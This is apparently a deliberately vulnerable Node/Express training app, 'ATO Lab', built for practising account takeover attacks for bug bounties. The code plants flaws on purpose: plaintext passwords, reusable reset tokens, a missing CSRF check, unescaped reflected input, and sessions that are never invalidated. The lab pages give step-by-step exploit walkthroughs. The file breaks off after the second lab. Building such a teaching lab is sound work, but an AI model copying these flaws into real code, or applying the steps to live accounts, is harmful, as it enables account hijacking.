const express = require("express")
const session = require("express-session")
const bodyParser = require("body-parser")

const app = express()

app.use(bodyParser.urlencoded({ extended: true }))
app.use(bodyParser.json())

app.use(session({
  secret: "ato-lab-secret",
  resave: false,
  saveUninitialized: true
}))

// ─── DATA STORES ────────────────────────────────────────────
const users = {
  "admin@corp.com":  { password: "admin123",  username: "admin",  role: "admin",  verified: true,  secQ1: "london", secQ2: "fluffy", secQ3: "toyota", trustedDevice: "device-admin-001" },
  "victim@corp.com": { password: "victim123", username: "victim", role: "user",   verified: true,  secQ1: "paris",  secQ2: "buddy",  secQ3: "honda",  trustedDevice: "device-victim-007" },
  "user@corp.com":   { password: "user123",   username: "user",   role: "user",   verified: false, secQ1: "berlin", secQ2: "max",    secQ3: "bmw",    trustedDevice: "device-user-002" }
}

let RESET_TOKENS   = {}   // token → email
let EMAIL_CHANGE   = {}   // token → { oldEmail, newEmail }
let OAUTH_ACCOUNTS = {}   // email → profile (third-party)
let OLD_SESSIONS   = {}   // email → [old session ids]
let CSRF_TOKENS    = {}   // sessionId → csrf token

// ─── FONT & STYLE ───────────────────────────────────────────
function layout(title, content, user = null) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${title} — ATO Lab</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg:        #050a0e;
      --surface:   #0a1520;
      --card:      #0d1e2e;
      --border:    #1a3a52;
      --accent:    #00d4ff;
      --accent2:   #ff4444;
      --accent3:   #00ff88;
      --warn:      #ffaa00;
      --text:      #c8dce8;
      --muted:     #4a7a96;
      --font-mono: 'Share Tech Mono', monospace;
      --font-ui:   'Rajdhani', sans-serif;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: var(--font-ui);
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      background-image:
        radial-gradient(ellipse at 10% 20%, rgba(0,212,255,0.04) 0%, transparent 50%),
        radial-gradient(ellipse at 90% 80%, rgba(0,255,136,0.03) 0%, transparent 50%),
        linear-gradient(180deg, #050a0e 0%, #040810 100%);
    }

    /* Scanline overlay */
    body::before {
      content: '';
      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: repeating-linear-gradient(
        0deg, transparent, transparent 2px,
        rgba(0,212,255,0.012) 2px, rgba(0,212,255,0.012) 4px
      );
      pointer-events: none; z-index: 9999;
    }

    /* ── HEADER ── */
    .header {
      background: rgba(10,21,32,0.95);
      border-bottom: 1px solid var(--border);
      padding: 0 32px;
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      backdrop-filter: blur(10px);
      position: sticky; top: 0; z-index: 100;
    }

    .logo {
      font-family: var(--font-mono);
      font-size: 15px;
      color: var(--accent);
      letter-spacing: 2px;
      text-shadow: 0 0 20px rgba(0,212,255,0.5);
      display: flex; align-items: center; gap: 10px;
    }
    .logo::before {
      content: '▶';
      color: var(--accent2);
      animation: blink 1.2s step-end infinite;
    }

    @keyframes blink { 50% { opacity: 0; } }

    .nav-user {
      font-family: var(--font-mono);
      font-size: 12px;
      color: var(--muted);
      display: flex; align-items: center; gap: 16px;
    }
    .nav-user .badge {
      background: rgba(0,212,255,0.1);
      border: 1px solid var(--accent);
      color: var(--accent);
      padding: 2px 10px;
      border-radius: 2px;
      font-size: 11px;
    }
    .nav-user .badge.admin { border-color: var(--accent2); color: var(--accent2); background: rgba(255,68,68,0.1); }

    /* ── LAYOUT ── */
    .page { display: flex; min-height: calc(100vh - 60px); }

    .sidebar {
      width: 220px;
      flex-shrink: 0;
      background: rgba(10,21,32,0.6);
      border-right: 1px solid var(--border);
      padding: 24px 0;
    }
    .sidebar-section {
      padding: 8px 20px 4px;
      font-family: var(--font-mono);
      font-size: 10px;
      color: var(--muted);
      letter-spacing: 2px;
      text-transform: uppercase;
    }
    .sidebar a {
      display: flex; align-items: center; gap: 8px;
      padding: 8px 20px;
      font-size: 13px;
      font-weight: 500;
      color: var(--text);
      text-decoration: none;
      border-left: 2px solid transparent;
      transition: all 0.15s;
      letter-spacing: 0.5px;
    }
    .sidebar a:hover { color: var(--accent); border-left-color: var(--accent); background: rgba(0,212,255,0.04); }
    .sidebar a .dot {
      width: 6px; height: 6px;
      border-radius: 50%;
      background: var(--muted);
      flex-shrink: 0;
    }
    .sidebar a:hover .dot { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
    .sidebar-divider { border: none; border-top: 1px solid var(--border); margin: 12px 20px; }

    .main { flex: 1; padding: 36px 40px; max-width: 900px; }

    /* ── CARDS ── */
    .card {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 4px;
      padding: 28px;
      margin-bottom: 20px;
      position: relative;
      overflow: hidden;
    }
    .card::before {
      content: '';
      position: absolute; top: 0; left: 0; right: 0;
      height: 1px;
      background: linear-gradient(90deg, transparent, var(--accent), transparent);
      opacity: 0.4;
    }

    .card-title {
      font-family: var(--font-mono);
      font-size: 13px;
      color: var(--accent);
      letter-spacing: 2px;
      margin-bottom: 6px;
      text-transform: uppercase;
    }
    .card-sub {
      font-size: 13px;
      color: var(--muted);
      margin-bottom: 20px;
      line-height: 1.5;
    }

    /* ── VULN BADGE ── */
    .vuln-tag {
      display: inline-block;
      font-family: var(--font-mono);
      font-size: 10px;
      padding: 2px 8px;
      border-radius: 2px;
      margin-bottom: 16px;
      letter-spacing: 1px;
    }
    .vuln-tag.high   { background: rgba(255,68,68,0.15);  border: 1px solid var(--accent2); color: var(--accent2); }
    .vuln-tag.medium { background: rgba(255,170,0,0.15);  border: 1px solid var(--warn);    color: var(--warn); }
    .vuln-tag.info   { background: rgba(0,212,255,0.1);   border: 1px solid var(--accent);  color: var(--accent); }
    .vuln-tag.green  { background: rgba(0,255,136,0.1);   border: 1px solid var(--accent3); color: var(--accent3); }

    /* ── FORMS ── */
    .field { margin-bottom: 14px; }
    label {
      display: block;
      font-family: var(--font-mono);
      font-size: 11px;
      color: var(--muted);
      letter-spacing: 1px;
      margin-bottom: 5px;
      text-transform: uppercase;
    }
    input[type=text], input[type=email], input[type=password], select, textarea {
      width: 100%;
      background: rgba(0,0,0,0.4);
      border: 1px solid var(--border);
      border-radius: 3px;
      padding: 10px 14px;
      color: var(--text);
      font-family: var(--font-mono);
      font-size: 13px;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    input:focus, select:focus, textarea:focus {
      border-color: var(--accent);
      box-shadow: 0 0 0 1px rgba(0,212,255,0.2), 0 0 12px rgba(0,212,255,0.08);
    }

    /* ── BUTTONS ── */
    .btn {
      display: inline-flex; align-items: center; justify-content: center; gap: 6px;
      padding: 10px 22px;
      font-family: var(--font-ui);
      font-size: 13px;
      font-weight: 600;
      letter-spacing: 1px;
      text-transform: uppercase;
      border: none; border-radius: 3px;
      cursor: pointer;
      text-decoration: none;
      transition: all 0.15s;
    }
    .btn-primary {
      background: var(--accent);
      color: #050a0e;
      box-shadow: 0 0 16px rgba(0,212,255,0.3);
    }
    .btn-primary:hover { background: #00eeff; box-shadow: 0 0 24px rgba(0,212,255,0.5); }
    .btn-danger {
      background: var(--accent2);
      color: white;
      box-shadow: 0 0 16px rgba(255,68,68,0.2);
    }
    .btn-danger:hover { background: #ff6666; }
    .btn-ghost {
      background: transparent;
      color: var(--muted);
      border: 1px solid var(--border);
    }
    .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }
    .btn-warn {
      background: var(--warn);
      color: #050a0e;
    }
    .btn-green {
      background: var(--accent3);
      color: #050a0e;
    }
    .btn-sm { padding: 6px 14px; font-size: 11px; }
    .btn-full { width: 100%; }

    /* ── ALERTS ── */
    .alert {
      padding: 12px 16px;
      border-radius: 3px;
      font-family: var(--font-mono);
      font-size: 12px;
      margin-bottom: 16px;
      border-left: 3px solid;
      line-height: 1.6;
    }
    .alert-info   { background: rgba(0,212,255,0.08);  border-color: var(--accent);  color: var(--accent); }
    .alert-danger { background: rgba(255,68,68,0.08);  border-color: var(--accent2); color: var(--accent2); }
    .alert-warn   { background: rgba(255,170,0,0.08);  border-color: var(--warn);    color: var(--warn); }
    .alert-success{ background: rgba(0,255,136,0.08); border-color: var(--accent3); color: var(--accent3); }

    /* ── TABLE ── */
    table { width: 100%; border-collapse: collapse; font-size: 13px; }
    th {
      font-family: var(--font-mono); font-size: 10px; letter-spacing: 2px;
      color: var(--muted); text-align: left; padding: 8px 12px;
      border-bottom: 1px solid var(--border); text-transform: uppercase;
    }
    td { padding: 10px 12px; border-bottom: 1px solid rgba(26,58,82,0.5); color: var(--text); font-size: 13px; }
    tr:last-child td { border-bottom: none; }
    tr:hover td { background: rgba(0,212,255,0.03); }

    /* ── CODE ── */
    .code-block {
      background: rgba(0,0,0,0.5);
      border: 1px solid var(--border);
      border-radius: 3px;
      padding: 14px;
      font-family: var(--font-mono);
      font-size: 12px;
      color: var(--accent3);
      overflow-x: auto;
      line-height: 1.6;
      margin: 10px 0;
    }

    /* ── GRID ── */
    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
    .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }

    /* ── STAT BOX ── */
    .stat-box {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 4px;
      padding: 20px;
      text-align: center;
      position: relative;
      overflow: hidden;
    }
    .stat-num { font-family: var(--font-mono); font-size: 28px; color: var(--accent); line-height: 1; }
    .stat-label { font-size: 11px; color: var(--muted); margin-top: 4px; letter-spacing: 1px; text-transform: uppercase; }

    /* ── PAGE TITLE ── */
    .page-title {
      font-family: var(--font-mono);
      font-size: 22px;
      color: var(--text);
      margin-bottom: 4px;
      letter-spacing: 1px;
    }
    .page-title span { color: var(--accent); }
    .page-sub {
      font-size: 13px;
      color: var(--muted);
      margin-bottom: 28px;
    }

    /* ── DIVIDER ── */
    .divider { border: none; border-top: 1px solid var(--border); margin: 24px 0; }

    /* ── MONO TEXT ── */
    .mono { font-family: var(--font-mono); }
    .c-accent  { color: var(--accent); }
    .c-danger  { color: var(--accent2); }
    .c-warn    { color: var(--warn); }
    .c-success { color: var(--accent3); }
    .c-muted   { color: var(--muted); }

    /* ── FORM INLINE ── */
    .inline-form { display: flex; gap: 8px; align-items: flex-end; }
    .inline-form .field { margin-bottom: 0; flex: 1; }

    /* ── LOGOUT LINK ── */
    .logout-link {
      font-family: var(--font-mono); font-size: 11px;
      color: var(--accent2); text-decoration: none;
    }
    .logout-link:hover { text-shadow: 0 0 8px var(--accent2); }

    /* ── HOME GRID ── */
    .vuln-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 14px; }
    .vuln-card {
      background: var(--card); border: 1px solid var(--border);
      border-radius: 4px; padding: 18px;
      text-decoration: none; color: var(--text);
      transition: all 0.2s; display: block;
    }
    .vuln-card:hover { border-color: var(--accent); transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,212,255,0.1); }
    .vuln-card-title { font-weight: 600; font-size: 14px; margin-bottom: 4px; }
    .vuln-card-desc  { font-size: 12px; color: var(--muted); line-height: 1.5; }

  </style>
</head>
<body>
  <div class="header">
    <div class="logo">ATO_LAB_v4 // ACCOUNT TAKEOVER TRAINING</div>
    <div class="nav-user">
      ${user ? `
        <span class="mono c-muted">SESSION:</span>
        <span class="mono c-accent">${user.username}</span>
        <span class="badge ${user.role === 'admin' ? 'admin' : ''}">${user.role.toUpperCase()}</span>
        <a href="/logout" class="logout-link">[LOGOUT]</a>
      ` : `<span class="mono c-muted">NOT AUTHENTICATED</span>`}
    </div>
  </div>

  <div class="page">
    <nav class="sidebar">
      <div class="sidebar-section">Navigation</div>
      <a href="/"><span class="dot"></span> Home</a>
      <a href="/login"><span class="dot"></span> Login</a>
      <a href="/register"><span class="dot"></span> Register</a>
      <a href="/dashboard"><span class="dot"></span> Dashboard</a>

      <hr class="sidebar-divider">
      <div class="sidebar-section">Attack Labs</div>
      <a href="/lab/reset-bypass"><span class="dot"></span> Reset Bypass</a>
      <a href="/lab/security-questions"><span class="dot"></span> Security Questions</a>
      <a href="/lab/email-change"><span class="dot"></span> Email Takeover</a>
      <a href="/lab/email-verify-bypass"><span class="dot"></span> Verify Bypass</a>
      <a href="/lab/unicode"><span class="dot"></span> Unicode Normalize</a>
      <a href="/lab/oauth"><span class="dot"></span> OAuth Bypass</a>
      <a href="/lab/cors"><span class="dot"></span> CORS Steal</a>
      <a href="/lab/csrf"><span class="dot"></span> CSRF Account</a>
      <a href="/lab/host-header"><span class="dot"></span> Host Header</a>
      <a href="/lab/response-manip"><span class="dot"></span> Response Manip</a>
      <a href="/lab/old-sessions"><span class="dot"></span> Old Sessions</a>
      <a href="/lab/trusted-device"><span class="dot"></span> Trusted Device</a>
      <a href="/lab/pre-ato"><span class="dot"></span> Pre-ATO</a>
    </nav>

    <main class="main">
      ${content}
    </main>
  </div>
</body>
</html>`
}

// ─── HOME ────────────────────────────────────────────────────
app.get("/", (req, res) => {
  const u = req.session.user ? users[req.session.email] : null
  res.send(layout("Home", `
    <div class="page-title">ACCOUNT <span>TAKEOVER</span> LAB</div>
    <div class="page-sub">Lab 4 — 13 intentional vulnerabilities for bug bounty training</div>

    <div class="grid-3" style="margin-bottom:28px">
      <div class="stat-box"><div class="stat-num">13</div><div class="stat-label">Vulnerabilities</div></div>
      <div class="stat-box"><div class="stat-num c-danger">3</div><div class="stat-label">Critical / High</div></div>
      <div class="stat-box"><div class="stat-num c-warn">3</div><div class="stat-label">Users</div></div>
    </div>

    <div class="card">
      <div class="card-title">TEST CREDENTIALS</div>
      <table>
        <tr><th>Email</th><th>Password</th><th>Role</th><th>Verified</th></tr>
        <tr><td class="mono c-accent">admin@corp.com</td><td class="mono">admin123</td><td><span class="vuln-tag high">ADMIN</span></td><td class="c-success">✓</td></tr>
        <tr><td class="mono c-accent">victim@corp.com</td><td class="mono">victim123</td><td><span class="vuln-tag info">USER</span></td><td class="c-success">✓</td></tr>
        <tr><td class="mono c-accent">user@corp.com</td><td class="mono">user123</td><td><span class="vuln-tag info">USER</span></td><td class="c-danger">✗</td></tr>
      </table>
    </div>

    <div class="card">
      <div class="card-title">VULNERABILITY INDEX</div>
      <div class="vuln-grid">
        <a class="vuln-card" href="/lab/reset-bypass"><span class="vuln-tag high">HIGH</span><div class="vuln-card-title">Password Reset Bypass</div><div class="vuln-card-desc">Reusable reset tokens grant dashboard access without credentials</div></a>
        <a class="vuln-card" href="/lab/security-questions"><span class="vuln-tag high">HIGH</span><div class="vuln-card-title">Security Question Overwrite</div><div class="vuln-card-desc">Unauthenticated username parameter overwrites any account's recovery data</div></a>
        <a class="vuln-card" href="/lab/email-change"><span class="vuln-tag high">HIGH</span><div class="vuln-card-title">Email Change Takeover</div><div class="vuln-card-desc">Change token can be forwarded to victim for silent email swap</div></a>
        <a class="vuln-card" href="/lab/email-verify-bypass"><span class="vuln-tag medium">MEDIUM</span><div class="vuln-card-title">Email Verify Bypass</div><div class="vuln-card-desc">Changing verified email to victim's email bypasses verification requirement</div></a>
        <a class="vuln-card" href="/lab/unicode"><span class="vuln-tag medium">MEDIUM</span><div class="vuln-card-title">Unicode Normalization</div><div class="vuln-card-desc">Unicode lookalike email collides with victim after normalization</div></a>
        <a class="vuln-card" href="/lab/oauth"><span class="vuln-tag medium">MEDIUM</span><div class="vuln-card-title">OAuth Pre-Account Takeover</div><div class="vuln-card-desc">Register with victim email before they sign up via OAuth</div></a>
        <a class="vuln-card" href="/lab/cors"><span class="vuln-tag medium">MEDIUM</span><div class="vuln-card-title">CORS Misconfiguration</div><div class="vuln-card-desc">Origin reflection leaks session token to attacker-controlled domain</div></a>
        <a class="vuln-card" href="/lab/csrf"><span class="vuln-tag medium">MEDIUM</span><div class="vuln-card-title">CSRF — Email Change</div><div class="vuln-card-desc">No CSRF token on email change endpoint</div></a>
        <a class="vuln-card" href="/lab/host-header"><span class="vuln-tag medium">MEDIUM</span><div class="vuln-card-title">Host Header Injection</div><div class="vuln-card-desc">Reset link poisoned with attacker domain via X-Forwarded-Host</div></a>
        <a class="vuln-card" href="/lab/response-manip"><span class="vuln-tag info">INFO</span><div class="vuln-card-title">Response Manipulation</div><div class="vuln-card-desc">Boolean JSON response can be flipped to gain access</div></a>
        <a class="vuln-card" href="/lab/old-sessions"><span class="vuln-tag info">INFO</span><div class="vuln-card-title">Old Session Reuse</div><div class="vuln-card-desc">Previous session cookies remain valid after logout</div></a>
        <a class="vuln-card" href="/lab/trusted-device"><span class="vuln-tag high">HIGH</span><div class="vuln-card-title">Trusted Device Cookie Leak</div><div class="vuln-card-desc">Batch API response chaining exposes trusted device token</div></a>
        <a class="vuln-card" href="/lab/pre-ato"><span class="vuln-tag medium">MEDIUM</span><div class="vuln-card-title">Pre-Account Takeover</div><div class="vuln-card-desc">Register victim email early; wait for them to confirm via OAuth</div></a>
      </div>
    </div>
  `, u))
})

// ─── AUTH ────────────────────────────────────────────────────
app.get("/login", (req, res) => {
  res.send(layout("Login", `
    <div class="page-title">AUTHENTICATE</div>
    <div class="page-sub">Enter credentials to begin session</div>
    <div class="card" style="max-width:420px">
      ${req.query.msg ? `<div class="alert alert-${req.query.type||'info'}">${req.query.msg}</div>` : ''}
      <form method="POST" action="/login">
        <div class="field"><label>Email</label><input type="email" name="email" placeholder="user@corp.com"></div>
        <div class="field"><label>Password</label><input type="password" name="password" placeholder="••••••••"></div>
        <button class="btn btn-primary btn-full" style="margin-top:8px">LOGIN</button>
      </form>
      <hr class="divider">
      <div class="card-sub" style="margin:0">Security Question Login (no password):</div>
      <a href="/login/security" class="btn btn-ghost btn-full" style="margin-top:8px">USE SECURITY QUESTIONS</a>
    </div>
  `))
})

app.post("/login", (req, res) => {
  const { email, password } = req.body
  const user = users[email]
  if (user && user.password === password) {
    // Save old session id (vuln: old sessions never invalidated)
    if (!OLD_SESSIONS[email]) OLD_SESSIONS[email] = []
    if (req.session.id) OLD_SESSIONS[email].push(req.session.id)

    req.session.email = email
    req.session.user = user
    req.session.authed = true
    res.redirect("/dashboard")
  } else {
    res.redirect("/login?msg=Invalid+credentials&type=danger")
  }
})

// Security question login
app.get("/login/security", (req, res) => {
  res.send(layout("Security Login", `
    <div class="page-title">SECURITY <span>QUESTION</span> LOGIN</div>
    <div class="page-sub">Answer your security questions to authenticate</div>
    <div class="alert alert-warn">⚠ VULN: Username field is user-supplied — attacker can target any account</div>
    <div class="card" style="max-width:480px">
      <form method="POST" action="/login/security">
        <div class="field"><label>Username (target account)</label><input name="username" placeholder="admin" value="${req.query.u||''}"></div>
        <div class="field"><label>Answer 1 — City Born</label><input name="a1" placeholder="london"></div>
        <div class="field"><label>Answer 2 — Pet Name</label><input name="a2" placeholder="fluffy"></div>
        <div class="field"><label>Answer 3 — First Car</label><input name="a3" placeholder="toyota"></div>
        <button class="btn btn-primary btn-full">AUTHENTICATE</button>
      </form>
    </div>
  `))
})

app.post("/login/security", (req, res) => {
  const { username, a1, a2, a3 } = req.body
  // Find user by username
  const entry = Object.entries(users).find(([_, u]) => u.username === username)
  if (!entry) return res.redirect(`/login/security?u=${username}&msg=not+found`)
  const [email, user] = entry
  if (
    a1.toLowerCase() === user.secQ1 &&
    a2.toLowerCase() === user.secQ2 &&
    a3.toLowerCase() === user.secQ3
  ) {
    req.session.email = email
    req.session.user = user
    req.session.authed = true
    res.redirect("/dashboard")
  } else {
    res.redirect(`/login/security?u=${username}&msg=Wrong+answers`)
  }
})

app.get("/register", (req, res) => {
  res.send(layout("Register", `
    <div class="page-title">CREATE <span>ACCOUNT</span></div>
    <div class="page-sub">Register a new account on the platform</div>
    <div class="card" style="max-width:420px">
      ${req.query.msg ? `<div class="alert alert-${req.query.type||'success'}">${decodeURIComponent(req.query.msg)}</div>` : ''}
      <form method="POST" action="/register">
        <div class="field"><label>Email</label><input type="email" name="email" placeholder="you@corp.com"></div>
        <div class="field"><label>Username</label><input name="username" placeholder="yourname"></div>
        <div class="field"><label>Password</label><input type="password" name="password" placeholder="••••••••"></div>
        <button class="btn btn-primary btn-full" style="margin-top:8px">REGISTER</button>
      </form>
    </div>
  `))
})

app.post("/register", (req, res) => {
  let { email, username, password } = req.body
  // VULN: No unicode normalization — vićtim@corp.com accepted alongside victim@corp.com
  // VULN: Pre-ATO — can register victim's email before they do
  if (users[email]) {
    return res.redirect(`/register?msg=${encodeURIComponent("Email already registered")}&type=danger`)
  }
  users[email] = { password, username, role: "user", verified: false, secQ1: "x", secQ2: "x", secQ3: "x", trustedDevice: null }
  res.redirect(`/register?msg=${encodeURIComponent("Account created! Awaiting email verification.")}`)
})

app.get("/dashboard", (req, res) => {
  if (!req.session.authed) return res.redirect("/login?msg=Access+denied&type=danger")
  const user = req.session.user
  res.send(layout("Dashboard", `
    <div class="page-title">DASHBOARD</div>
    <div class="page-sub">Authenticated session — welcome back</div>
    <div class="grid-2" style="margin-bottom:20px">
      <div class="stat-box"><div class="stat-num">${user.role === 'admin' ? '👑' : '👤'}</div><div class="stat-label">${user.role}</div></div>
      <div class="stat-box"><div class="stat-num mono c-accent" style="font-size:14px">${req.session.email}</div><div class="stat-label">Current Email</div></div>
    </div>
    <div class="card">
      <div class="card-title">SESSION INFO</div>
      <div class="code-block">session.id     = ${req.session.id}<br>session.email  = ${req.session.email}<br>session.authed = ${req.session.authed}<br>user.role      = ${user.role}<br>user.verified  = ${user.verified}<br>trusted.device = ${user.trustedDevice || 'none'}</div>
    </div>
    <div class="card">
      <div class="card-title">ACCOUNT ACTIONS</div>
      <div style="display:flex;gap:10px;flex-wrap:wrap">
        <a href="/account/change-email" class="btn btn-ghost btn-sm">Change Email</a>
        <a href="/account/change-password" class="btn btn-ghost btn-sm">Change Password</a>
        <a href="/admin" class="btn btn-danger btn-sm">Admin Panel</a>
      </div>
    </div>
  `, user))
})

app.get("/admin", (req, res) => {
  if (!req.session.authed) return res.redirect("/login")
  // VULN: Response manipulation — if JSON request, returns boolean that can be flipped
  const user = req.session.user
  if (req.headers.accept === 'application/json') {
    return res.json({ authorized: user.role === 'admin', user: user.username })
  }
  if (user.role !== 'admin') {
    return res.send(layout("Admin", `
      <div class="alert alert-danger">ACCESS DENIED — Admin role required</div>
      <div class="card">
        <div class="card-title">RESPONSE MANIPULATION HINT</div>
        <div class="card-sub">This endpoint returns <span class="mono c-accent">{"authorized": false}</span> for non-admins via JSON.<br>Try changing it to <span class="mono c-accent">{"authorized": true}</span> in Burp Proxy.</div>
        <div class="code-block">GET /admin HTTP/1.1<br>Accept: application/json<br><br>Response: {"authorized": false, "user": "${user.username}"}</div>
      </div>
    `, user))
  }
  res.send(layout("Admin Panel", `
    <div class="page-title">ADMIN <span>PANEL</span></div>
    <div class="alert alert-success">✓ Admin access granted</div>
    <div class="card">
      <div class="card-title">ALL USERS</div>
      <table>
        <tr><th>Email</th><th>Role</th><th>Verified</th><th>Trusted Device</th></tr>
        ${Object.entries(users).map(([e,u]) => `
          <tr>
            <td class="mono">${e}</td>
            <td><span class="vuln-tag ${u.role==='admin'?'high':'info'}">${u.role}</span></td>
            <td class="${u.verified?'c-success':'c-danger'}">${u.verified ? '✓ YES' : '✗ NO'}</td>
            <td class="mono c-muted">${u.trustedDevice || 'none'}</td>
          </tr>`).join('')}
      </table>
    </div>
  `, user))
})

app.get("/logout", (req, res) => {
  // VULN: Old session IDs stored in OLD_SESSIONS are never purged
  req.session.destroy(() => res.redirect("/"))
})

// ─── ACCOUNT ACTIONS ─────────────────────────────────────────
app.get("/account/change-email", (req, res) => {
  if (!req.session.authed) return res.redirect("/login")
  res.send(layout("Change Email", `
    <div class="page-title">CHANGE <span>EMAIL</span></div>
    <div class="page-sub">A confirmation link will be sent to the NEW email</div>
    <div class="card" style="max-width:480px">
      ${req.query.msg ? `<div class="alert alert-info">${decodeURIComponent(req.query.msg)}</div>` : ''}
      <form method="POST" action="/account/change-email">
        <div class="field"><label>New Email</label><input type="email" name="newEmail" placeholder="new@corp.com"></div>
        <button class="btn btn-primary">REQUEST CHANGE</button>
      </form>
    </div>
  `, req.session.user))
})

app.post("/account/change-email", (req, res) => {
  if (!req.session.authed) return res.redirect("/login")
  // VULN CSRF: No CSRF token checked
  // VULN Email-Change ATO: token sent to NEW email, attacker can send victim the link
  const token = Math.random().toString(36).substring(2, 10)
  EMAIL_CHANGE[token] = { oldEmail: req.session.email, newEmail: req.body.newEmail }
  const link = `http://localhost:3002/account/confirm-email/${token}`
  res.redirect(`/account/change-email?msg=${encodeURIComponent(`Confirmation link (debug): ${link}`)}`)
})

app.get("/account/confirm-email/:token", (req, res) => {
  const change = EMAIL_CHANGE[req.params.token]
  // VULN: Token is not invalidated after use (reusable)
  if (!change) return res.send(layout("Error", `<div class="alert alert-danger">Invalid token</div>`))
  const old = change.oldEmail
  users[change.newEmail] = { ...users[old] }
  delete users[old]
  req.session.email = change.newEmail
  req.session.user = users[change.newEmail]
  res.send(layout("Email Changed", `
    <div class="alert alert-success">✓ Email changed to <span class="mono">${change.newEmail}</span></div>
    <div class="alert alert-warn">⚠ VULN: This token is reusable — the old email is gone but token still works!</div>
    <a href="/dashboard" class="btn btn-primary">DASHBOARD</a>
  `, req.session.user))
})

// ─── LABS ────────────────────────────────────────────────────

// LAB 1: Password Reset Bypass
app.get("/lab/reset-bypass", (req, res) => {
  res.send(layout("Reset Bypass", `
    <div class="page-title">PASSWORD <span>RESET</span> BYPASS</div>
    <div class="vuln-tag high">HIGH — ATO via reset token reuse</div>
    <div class="page-sub">Reset tokens are not invalidated after use and have no expiry</div>
    <div class="card">
      <div class="card-title">STEP 1 — REQUEST RESET</div>
      ${req.query.token ? `<div class="alert alert-warn">Reset link (debug): <span class="mono">/lab/reset-bypass/use/${req.query.token}</span></div>` : ''}
      <form method="POST" action="/lab/reset-bypass/request">
        <div class="inline-form">
          <div class="field"><label>Email</label><input name="email" placeholder="victim@corp.com"></div>
          <button class="btn btn-primary">GET RESET LINK</button>
        </div>
      </form>
    </div>
    <div class="card">
      <div class="card-title">STEP 2 — USE TOKEN (bypass login)</div>
      <div class="card-sub">Visiting the reset link logs in without any password — token is also reusable</div>
      <form method="GET" action="/lab/reset-bypass/use-form">
        <div class="inline-form">
          <div class="field"><label>Token</label><input name="token" placeholder="paste token here"></div>
          <a href="#" onclick="document.forms[1].submit()" class="btn btn-danger">USE TOKEN</a>
        </div>
      </form>
    </div>
    <div class="card">
      <div class="card-title">HOW TO EXPLOIT</div>
      <div class="code-block">
# 1. Request reset for victim@corp.com<br>
# 2. Copy token from debug output<br>
# 3. Reuse token multiple times — no expiry, no invalidation<br>
# 4. Each visit logs you into victim's account<br>
POST /lab/reset-bypass/request   body: email=victim@corp.com<br>
GET  /lab/reset-bypass/use/TOKEN → authenticated as victim
      </div>
    </div>
  `))
})

app.post("/lab/reset-bypass/request", (req, res) => {
  const email = req.body.email
  if (!users[email]) return res.redirect("/lab/reset-bypass?err=not+found")
  // VULN: Token never expires, never invalidated
  const token = Math.random().toString(36).substring(2, 12)
  RESET_TOKENS[token] = email
  res.redirect(`/lab/reset-bypass?token=${token}`)
})

app.get("/lab/reset-bypass/use-form", (req, res) => {
  res.redirect(`/lab/reset-bypass/use/${req.query.token}`)
})

app.get("/lab/reset-bypass/use/:token", (req, res) => {
  const email = RESET_TOKENS[req.params.token]
  // VULN: Token reusable, grants full session
  if (!email || !users[email]) return res.send(layout("Error", `<div class="alert alert-danger">Invalid token</div>`))
  req.session.email = email
  req.session.user = users[email]
  req.session.authed = true
  res.send(layout("Reset Success", `
    <div class="alert alert-success">✓ Logged in as <span class="mono">${email}</span> via reset token</div>
    <div class="alert alert-warn">⚠ Token still valid — use it again: <span class="mono">/lab/reset-bypass/use/${req.params.token}</span></div>
    <a href="/dashboard" class="btn btn-primary">GO TO DASHBOARD</a>
    <a href="/lab/reset-bypass/use/${req.params.token}" class="btn btn-danger" style="margin-left:8px">REUSE TOKEN</a>
  `, users[email]))
})

// LAB 2: Security Question Overwrite
app.get("/lab/security-questions", (req, res) => {
  res.send(layout("Security Questions", `
    <div class="page-title">SECURITY QUESTION <span>OVERWRITE</span></div>
    <div class="vuln-tag high">HIGH — ATO via username parameter injection</div>
    <div class="page-sub">The update endpoint accepts a username field even for authenticated users, allowing overwrite of ANY account's security answers</div>
    <div class="card">
      <div class="card-title">STEP 1 — LOGIN AS ATTACKER</div>
      <div class="card-sub">Login as user@corp.com / user123 to get a valid session</div>
      <a href="/login" class="btn btn-ghost btn-sm">Go to Login</a>
    </div>
    <div class="card">
      <div class="card-title">STEP 2 — OVERWRITE VICTIM'S SECURITY ANSWERS</div>
      <div class="alert alert-warn">⚠ VULN: username field is attacker-controlled. Target any account.</div>
      ${req.query.msg ? `<div class="alert alert-success">${decodeURIComponent(req.query.msg)}</div>` : ''}
      <form method="POST" action="/lab/security-questions/update">
        <div class="field"><label>Target Username (inject victim)</label><input name="username" placeholder="admin" value="admin"></div>
        <div class="field"><label>New Answer 1</label><input name="a1" value="hacked"></div>
        <div class="field"><label>New Answer 2</label><input name="a2" value="hacked"></div>
        <div class="field"><label>New Answer 3</label><input name="a3" value="hacked"></div>
        <button class="btn btn-danger">OVERWRITE ANSWERS</button>
      </form>
    </div>
    <div class="card">
      <div class="card-title">STEP 3 — LOGIN AS VICTIM VIA SECURITY QUESTIONS</div>
      <a href="/login/security?u=admin" class="btn btn-primary">TRY SECURITY LOGIN → admin</a>
    </div>
    <div class="card">
      <div class="card-title">REQUEST</div>
      <div class="code-block">POST /lab/security-questions/update<br>Cookie: session=&lt;low-priv-user&gt;<br><br>username=admin&new_answer1=hacked&new_answer2=hacked&new_answer3=hacked</div>
    </div>
  `, req.session.user))
})

